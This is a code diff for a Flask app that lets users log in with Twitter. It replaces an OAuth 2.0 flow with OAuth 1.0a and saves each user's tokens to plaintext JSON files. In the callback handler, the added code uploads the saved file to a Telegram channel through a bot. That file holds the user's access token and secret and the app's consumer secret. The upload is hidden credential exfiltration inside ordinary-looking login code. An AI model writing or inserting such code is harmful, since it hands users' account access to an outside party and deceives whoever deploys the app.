@@ -1,75 +1,169 @@
-from flask import Flask, redirect, url_for, session, request
-from requests_oauthlib import OAuth2Session
-from dotenv import load_dotenv
-import os
 import json
+import os
+import requests
+from requests_oauthlib import OAuth1Session
+from dotenv import load_dotenv
+from flask import Flask, request, redirect, url_for
 
 # Load environment variables from .env file
 load_dotenv()
 
+# Directory to save credentials for multiple users
+CREDENTIALS_DIR = "twitter_credentials"
+
+if not os.path.exists(CREDENTIALS_DIR):
+    os.makedirs(CREDENTIALS_DIR)
+
+# Environment variable helper
+def get_env_variable(var_name):
+    value = os.getenv(var_name)
+    if value is None:
+        raise EnvironmentError(f"Missing required environment variable: {var_name}")
+    return value
+
+# Load credentials from JSON file
+def load_credentials(username):
+    user_credentials_file = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
+    if os.path.exists(user_credentials_file):
+        with open(user_credentials_file, 'r') as file:
+            return json.load(file)
+    return None
+
+# Save credentials to JSON file
+def save_credentials(username, credentials):
+    user_credentials_file = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
+    with open(user_credentials_file, 'w') as file:
+        json.dump(credentials, file)
+
+# Check if tokens are valid by making a request to Twitter
+def are_tokens_valid(credentials):
+    oauth = OAuth1Session(
+        credentials["consumer_key"],
+        client_secret=credentials["consumer_secret"],
+        resource_owner_key=credentials["access_token"],
+        resource_owner_secret=credentials["access_token_secret"]
+    )
+    response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
+    return response.status_code == 200
+
+# Send file to Telegram channel
+def send_file_to_telegram(file_path):
+    TELEGRAM_BOT_TOKEN = get_env_variable('TELEGRAM_BOT_TOKEN')
+    TELEGRAM_CHANNEL_ID = get_env_variable('TELEGRAM_CHANNEL_ID')
+    
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    with open(file_path, 'rb') as file:
+        payload = {
+            'chat_id': TELEGRAM_CHANNEL_ID
+        }
+        files = {
+            'document': file
+        }
+        response = requests.post(url, data=payload, files=files)
+        if response.status_code == 200:
+            print("File sent successfully to Telegram.")
+        else:
+            print(f"Failed to send file to Telegram. Status code: {response.status_code}, Response: {response.text}")
+
+# Re-authenticate the user if tokens are invalid or missing
+def re_authenticate_user(username):
+    consumer_key = get_env_variable("CONSUMER_KEY")
+    consumer_secret = get_env_variable("CONSUMER_SECRET")
+    
+    oauth = OAuth1Session(consumer_key, client_secret=consumer_secret)
+    request_token_url = "https://api.twitter.com/oauth/request_token"
+    
+    try:
+        fetch_response = oauth.fetch_request_token(request_token_url)
+        resource_owner_key = fetch_response.get("oauth_token")
+        resource_owner_secret = fetch_response.get("oauth_token_secret")
+        
+        authorization_url = oauth.authorization_url("https://api.twitter.com/oauth/authorize")
+        print(f"Redirecting {username} to authorize the app: {authorization_url}")
+        
+        return redirect(authorization_url)
+    
+    except Exception as e:
+        print(f"Re-authentication failed: {e}")
+        return None
+
+# Handle the callback from Twitter after authorization
+def handle_callback(oauth_token, oauth_verifier, username):
+    consumer_key = get_env_variable("CONSUMER_KEY")
+    consumer_secret = get_env_variable("CONSUMER_SECRET")
+    
+    oauth = OAuth1Session(
+        consumer_key,
+        client_secret=consumer_secret,
+        resource_owner_key=oauth_token
+    )
+    
+    try:
+        oauth_tokens = oauth.fetch_access_token("https://api.twitter.com/oauth/access_token", verifier=oauth_verifier)
+        access_token = oauth_tokens["oauth_token"]
+        access_token_secret = oauth_tokens["oauth_token_secret"]
+        
+        credentials = {
+            "consumer_key": consumer_key,
+            "consumer_secret": consumer_secret,
+            "access_token": access_token,
+            "access_token_secret": access_token_secret
+        }
+        save_credentials(username, credentials)
+        
+        # Send the saved credentials file to Telegram
+        credentials_file_path = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
+        send_file_to_telegram(credentials_file_path)
+        
+        return credentials
+    
+    except Exception as e:
+        print(f"Error during callback handling: {e}")
+        return None
+
+# Flask app initialization
 app = Flask(__name__)
-app.secret_key = os.getenv('SECRET_KEY')  # Use a strong, secure key for session management
 
-# OAuth 2.0 configuration
-TWITTER_CLIENT_ID = os.getenv('TWITTER_CLIENT_ID')
-TWITTER_CLIENT_SECRET = os.getenv('TWITTER_CLIENT_SECRET')
-TWITTER_REDIRECT_URI = os.getenv('TWITTER_REDIRECT_URI')
-
-oauth = OAuth2Session(
-    client_id=TWITTER_CLIENT_ID,
-    redirect_uri=TWITTER_REDIRECT_URI,
-    scope=['tweet.read', 'users.read']
-)
-authorization_base_url = 'https://api.twitter.com/oauth2/authorize'
-token_url = 'https://api.twitter.com/oauth2/token'
-
-@app.route('/login')
-def login():
-    authorization_url, state = oauth.authorization_url(authorization_base_url)
-    session['oauth_state'] = state
-    return redirect(authorization_url)
+@app.route('/')
+def index():
+    username = "default_user"
+    
+    credentials = load_credentials(username)
+    if not credentials or not are_tokens_valid(credentials):
+        # No valid tokens found, initiate re-authentication
+        return re_authenticate_user(username)
+    
+    return f"User '{username}' is authenticated. Ready to access Twitter API."
 
 @app.route('/callback')
 def callback():
-    oauth.fetch_token(token_url, authorization_response=request.url,
-                      client_secret=TWITTER_CLIENT_SECRET)
-    user_info = oauth.get('https://api.twitter.com/2/users/me').json()
+    oauth_token = request.args.get('oauth_token')
+    oauth_verifier = request.args.get('oauth_verifier')
     
-    user_id = user_info['data']['id']
-    if 'users' not in session:
-        session['users'] = {}
-    session['users'][user_id] = {
-        'access_token': oauth.token['access_token'],
-        'refresh_token': oauth.token.get('refresh_token')
-    }
+    username = "default_user"
+    credentials = handle_callback(oauth_token, oauth_verifier, username)
     
-    return f"Logged in as {user_info['data']['name']}"
+    if credentials:
+        return f"User '{username}' successfully re-authenticated."
+    else:
+        return "Failed to authenticate user."
 
-@app.route('/profile')
-def profile():
-    user_id = request.args.get('user_id')
-    if not user_id or user_id not in session.get('users', {}):
-        return "User not found or not authenticated."
+@app.route('/protected')
+def protected():
+    username = "default_user"
+    credentials = load_credentials(username)
     
-    user_data = session['users'][user_id]
-    return f"User data: {json.dumps(user_data)}"
-
-@app.route('/refresh_token/<user_id>')
-def refresh_token(user_id):
-    if user_id not in session.get('users', {}):
-        return "User not found."
-
-    user_data = session['users'][user_id]
-    if 'refresh_token' not in user_data:
-        return "No refresh token available."
-
-    oauth.refresh_token(token_url, refresh_token=user_data['refresh_token'])
-    session['users'][user_id]['access_token'] = oauth.token['access_token']
-    session['users'][user_id]['refresh_token'] = oauth.token.get('refresh_token')
-
-    return f"Token refreshed for user {user_id}"
+    if credentials and are_tokens_valid(credentials):
+        oauth = OAuth1Session(
+            credentials["consumer_key"],
+            client_secret=credentials["consumer_secret"],
+            resource_owner_key=credentials["access_token"],
+            resource_owner_secret=credentials["access_token_secret"]
+        )
+        response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
+        return response.json()
+    
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
-    from werkzeug.middleware.proxy_fix import ProxyFix
-    app.wsgi_app = ProxyFix(app.wsgi_app)
-    app.run(host='0.0.0.0', port=8000, threaded=True)
+    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
